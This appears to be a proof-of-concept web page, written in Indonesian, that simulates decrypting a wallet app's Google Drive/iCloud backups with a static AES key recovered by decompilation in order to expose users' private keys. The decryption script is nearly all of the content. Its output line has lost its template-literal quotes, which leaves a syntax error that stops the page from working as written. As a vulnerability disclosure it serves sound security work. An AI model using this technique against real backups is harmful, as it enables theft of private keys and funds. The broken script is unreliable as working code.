<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC: Unsafe Cloud Backup Encryption</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
        body { font-family: sans-serif; background: #0b0e11; color: #eaecef; padding: 20px; text-align: center; }
        .container { max-width: 500px; margin: auto; background: #1e2329; padding: 25px; border-radius: 12px; border: 1px solid #474d57; }
        .warning { color: #f44336; font-weight: bold; background: rgba(244, 67, 54, 0.1); padding: 10px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #f44336; }
        #output { background: #000; color: #00ef8b; padding: 15px; border-radius: 8px; font-family: monospace; margin-top: 20px; text-align: left; min-height: 100px; font-size: 0.9em; border: 1px solid #333; }
        .btn { background: #00ef8b; color: #000; border: none; padding: 15px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
        .label { display: block; text-align: left; margin-bottom: 5px; font-size: 0.85em; color: #848e9c; }
    </style>
</head>
<body>

<div class="container">
    <h3>Simulasi Eksploitasi Cloud Backup</h3>
    <div class="warning">Dampak: Kunci Privat dapat dicuri dari Cloud!</div>
    
    <label class="label">Kunci Enkripsi Statis (Ditemukan dari Dekompilasi):</label>
    <input type="text" value="AES_PASSWORD_DARI_ENV_DART" style="width: 100%; padding: 10px; border-radius: 5px; background: #2b3139; color: #aaa; border: 1px solid #444; margin-bottom: 15px;" readonly>

    <label class="label">Contoh Data Terenkripsi dari Google Drive/iCloud:</label>
    <textarea id="encryptedData" style="width: 100%; height: 60px; padding: 10px; border-radius: 5px; background: #2b3139; color: white; border: 1px solid #474d57; resize: none;">U2FsdGVkX1+zT2h4U0m1K8X1qIe+9HjL2Yj/v6V7Z6Y=</textarea>
    
    <button class="btn" onclick="decryptBackup()">DEKRIPSI CADANGAN CLOUD</button>

    <div id="output">Status: Menunggu file cadangan...</div>
</div>

<script>
    function decryptBackup() {
        const output = document.getElementById('output');
        const encryptedData = document.getElementById('encryptedData').value;
        
        // Kunci ini dikodekan secara permanen di aplikasi (Hardcoded)
        // Dalam simulasi ini kita menggunakan string contoh
        const hardcodedKey = "AES_PASSWORD_DARI_ENV_DART";

        output.innerHTML = "Mencoba mendekripsi dengan kunci global...<br>";

        try {
            // Simulasi proses dekripsi AES
            const bytes = CryptoJS.AES.decrypt(encryptedData, hardcodedKey);
            const originalText = bytes.toString(CryptoJS.enc.Utf8);

            if (originalText) {
                output.innerHTML += "<br><span style='color:white;'>[BERHASIL DEKRIPSI]</span><br>";
                output.innerHTML += Kunci Privat: <strong style='color:#f0b90b;'>${originalText}</strong><br>;
                output.innerHTML += "<br><small>Kesimpulan: Karena kunci bersifat statis untuk semua pengguna, data di cloud tidak benar-benar terlindungi.</small>";
            } else {
                output.innerHTML += "<br><span style='color:red;'>Gagal Dekripsi.</span><br><small>Data tidak valid atau kunci salah.</small>";
            }
        } catch (e) {
            output.innerHTML += "<br>Error: " + e.message;
        }
    }
</script>

</body>
</html>
